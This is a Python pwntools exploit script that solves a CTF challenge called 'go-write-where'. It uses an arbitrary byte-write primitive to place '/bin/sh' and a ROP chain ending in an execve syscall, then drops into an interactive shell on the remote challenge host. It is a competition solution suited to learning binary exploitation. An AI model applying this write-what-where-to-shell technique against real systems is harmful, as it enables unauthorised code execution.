#!/usr/bin/env python3
import sys

from pwn import *

BINARY_PATH = "/ctf-writeups/2025/l3akctf/pwn/go-write-where/dist/chall"
REMOTE_HOST = "34.45.81.67"
REMOTE_PORT = 16003

context.binary = BINARY_PATH
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h", "-p 65"]

elf = context.binary

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def write_byte(r, addr, val):
    r.sendlineafter(b"): ", b"w")
    r.sendlineafter(b"):", hex(addr).encode())
    r.sendlineafter(b"):", hex(val).encode())


def write_qword(r, addr, val):
    for i in range(8):
        write_byte(r, addr + i, val[i])


def build_rop():
    pop_rdi     = 0x46b3e6  # pop rdi ; setne al ; ret
    mov_rsi_rax = 0x41338f  # mov rsi, rax ; ret
    pop_rdx     = 0x47bd2e  # pop rdx ; sbb byte ptr [rax + 0x29], cl ; ret
    pop_rax     = 0x4224c4  # pop rax ; ret
    syscall     = 0x40336c  # syscall

    rop = ROP(elf)
    rop.raw([
        pop_rdi, elf.bss(),
        pop_rax, 0,
        mov_rsi_rax,
        pop_rax, elf.bss(),
        pop_rdx, 0,
        pop_rax, 0x3b,
        syscall
    ])
    return rop.chain()


def exploit(r):
    #attach(r)

    payload = build_rop()
    loop_cnt = 0xc00009cdb8

    write_byte(r, loop_cnt, 0xff)
    write_qword(r, elf.bss(), b"/bin/sh\0")

    for i in range(0, len(payload), 8):
        write_qword(r, 0xc00009cf48 + i, payload[i:i+8])

    write_byte(r, loop_cnt, 1)
    r.interactive()


def main():
    while True:
        if is_remote:
            r = remote(REMOTE_HOST, REMOTE_PORT)
        else:
            r = process(elf.path)

        try:
            exploit(r)
        except:
            r.close()


if __name__ == "__main__":
    main()
